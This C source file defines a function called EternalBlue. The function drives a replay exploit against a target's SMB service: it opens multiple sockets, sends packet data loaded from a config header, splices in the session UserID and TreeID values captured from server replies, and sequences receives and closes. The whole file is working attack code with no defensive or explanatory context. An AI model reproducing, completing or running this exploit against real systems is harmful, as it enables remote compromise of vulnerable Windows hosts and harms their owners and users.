#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

int EternalBlue(const char *ip, int port)
{
    WSADATA wsa_data;
    SOCKET sockets[NUM_SOCKETS + 1];
    uint8_t userid[2] = {0, 0};
    uint8_t treeid[2] = {0, 0};
    struct sockaddr_in address;
    size_t packet_size = sizeof(EB_PACKETS) - 1;
    int result = -1;
    int wsa_started = 0;

    for (size_t i = 0; i < NUM_SOCKETS + 1; ++i)
        sockets[i] = INVALID_SOCKET;

    if (ip == NULL || port < 1 || port > 65535)
        return -1;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        printf("EternalBlue: WSAStartup failed\n");
        return -1;
    }
    wsa_started = 1;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1) {
        printf("EternalBlue: invalid IPv4 address\n");
        goto cleanup;
    }

    result = 0;
    for (size_t i = 0; i < EB_OPS_COUNT; ++i) {
        const eb_op_t *op = &EB_OPS[i];
        size_t stream = (size_t)op->stream;

        if (stream < 1 || stream > NUM_SOCKETS) {
            printf("EternalBlue: operation %zu has invalid stream\n", i);
            result = -1;
            goto cleanup;
        }

        switch (op->kind) {
        case 0: {
            if (sockets[stream] != INVALID_SOCKET) {
                printf("EternalBlue: operation %zu reconnects an active stream\n", i);
                result = -1;
                goto cleanup;
            }
            SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s == INVALID_SOCKET) {
                printf("EternalBlue: socket creation failed at operation %zu\n", i);
                result = -1;
                goto cleanup;
            }
            sockets[stream] = s;
            printf("EternalBlue: connect stream %zu\n", stream);
            if (connect(s, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR) {
                printf("EternalBlue: connect failed on stream %zu\n", stream);
                result = -1;
                goto cleanup;
            }
            break;
        }

        case 1: {
            size_t offset = (size_t)op->offset;
            size_t length = (size_t)op->length;
            if (sockets[stream] == INVALID_SOCKET ||
                offset > packet_size || length > packet_size - offset) {
                printf("EternalBlue: invalid send at operation %zu\n", i);
                result = -1;
                goto cleanup;
            }

            uint8_t *buffer = (uint8_t *)malloc(length == 0 ? 1 : length);
            if (buffer == NULL) {
                printf("EternalBlue: allocation failed at operation %zu\n", i);
                result = -1;
                goto cleanup;
            }
            if (length != 0)
                memcpy(buffer, EB_PACKETS + offset, length);

            static const uint8_t userid_marker[] = "__USERID__PLACEHOLDER__";
            static const uint8_t treeid_marker[] = "__TREEID__PLACEHOLDER__";
            size_t userid_marker_length = sizeof(userid_marker) - 1;
            size_t treeid_marker_length = sizeof(treeid_marker) - 1;
            uint8_t *fixed = (uint8_t *)malloc(length == 0 ? 1 : length);
            if (fixed == NULL) {
                free(buffer);
                printf("EternalBlue: allocation failed at operation %zu\n", i);
                result = -1;
                goto cleanup;
            }

            size_t read_position = 0;
            size_t write_position = 0;
            while (read_position < length) {
                size_t remaining = length - read_position;
                if (remaining >= userid_marker_length &&
                    memcmp(buffer + read_position, userid_marker, userid_marker_length) == 0) {
                    memcpy(fixed + write_position, userid, sizeof(userid));
                    read_position += userid_marker_length;
                    write_position += sizeof(userid);
                } else if (remaining >= treeid_marker_length &&
                           memcmp(buffer + read_position, treeid_marker, treeid_marker_length) == 0) {
                    memcpy(fixed + write_position, treeid, sizeof(treeid));
                    read_position += treeid_marker_length;
                    write_position += sizeof(treeid);
                } else {
                    fixed[write_position++] = buffer[read_position++];
                }
            }
            free(buffer);

            printf("EternalBlue: send %zu bytes on stream %zu\n", write_position, stream);
            size_t sent = 0;
            while (sent < write_position) {
                size_t remaining = write_position - sent;
                int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
                int n = send(sockets[stream], (const char *)fixed + sent, chunk, 0);
                if (n == SOCKET_ERROR || n == 0) {
                    free(fixed);
                    printf("EternalBlue: send failed on stream %zu\n", stream);
                    result = -1;
                    goto cleanup;
                }
                sent += (size_t)n;
            }
            free(fixed);
            break;
        }

        case 2: {
            size_t length = (size_t)op->length;
            if (sockets[stream] == INVALID_SOCKET) {
                printf("EternalBlue: receive on disconnected stream %zu\n", stream);
                result = -1;
                goto cleanup;
            }
            uint8_t *buffer = (uint8_t *)malloc(length == 0 ? 1 : length);
            if (buffer == NULL) {
                printf("EternalBlue: allocation failed at operation %zu\n", i);
                result = -1;
                goto cleanup;
            }

            printf("EternalBlue: receive %zu bytes on stream %zu\n", length, stream);
            size_t received = 0;
            while (received < length) {
                size_t remaining = length - received;
                int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
                int n = recv(sockets[stream], (char *)buffer + received, chunk, 0);
                if (n == SOCKET_ERROR || n == 0) {
                    free(buffer);
                    printf("EternalBlue: receive failed on stream %zu\n", stream);
                    result = -1;
                    goto cleanup;
                }
                received += (size_t)n;
            }

            if (op->fix == 1) {
                if (length < 34) {
                    free(buffer);
                    printf("EternalBlue: short response for UserID at operation %zu\n", i);
                    result = -1;
                    goto cleanup;
                }
                memcpy(userid, buffer + 32, sizeof(userid));
            } else if (op->fix == 2) {
                if (length < 30) {
                    free(buffer);
                    printf("EternalBlue: short response for TreeID at operation %zu\n", i);
                    result = -1;
                    goto cleanup;
                }
                memcpy(treeid, buffer + 28, sizeof(treeid));
            }
            free(buffer);
            break;
        }

        case 3:
            if (sockets[stream] == INVALID_SOCKET) {
                printf("EternalBlue: close on disconnected stream %zu\n", stream);
                result = -1;
                goto cleanup;
            }
            printf("EternalBlue: close stream %zu\n", stream);
            if (closesocket(sockets[stream]) == SOCKET_ERROR) {
                sockets[stream] = INVALID_SOCKET;
                printf("EternalBlue: close failed on stream %zu\n", stream);
                result = -1;
                goto cleanup;
            }
            sockets[stream] = INVALID_SOCKET;
            break;

        default:
            printf("EternalBlue: operation %zu has invalid kind\n", i);
            result = -1;
            goto cleanup;
        }
    }

cleanup:
    for (size_t i = 1; i <= NUM_SOCKETS; ++i) {
        if (sockets[i] != INVALID_SOCKET) {
            closesocket(sockets[i]);
            sockets[i] = INVALID_SOCKET;
        }
    }
    if (wsa_started)
        WSACleanup();
    return result;
}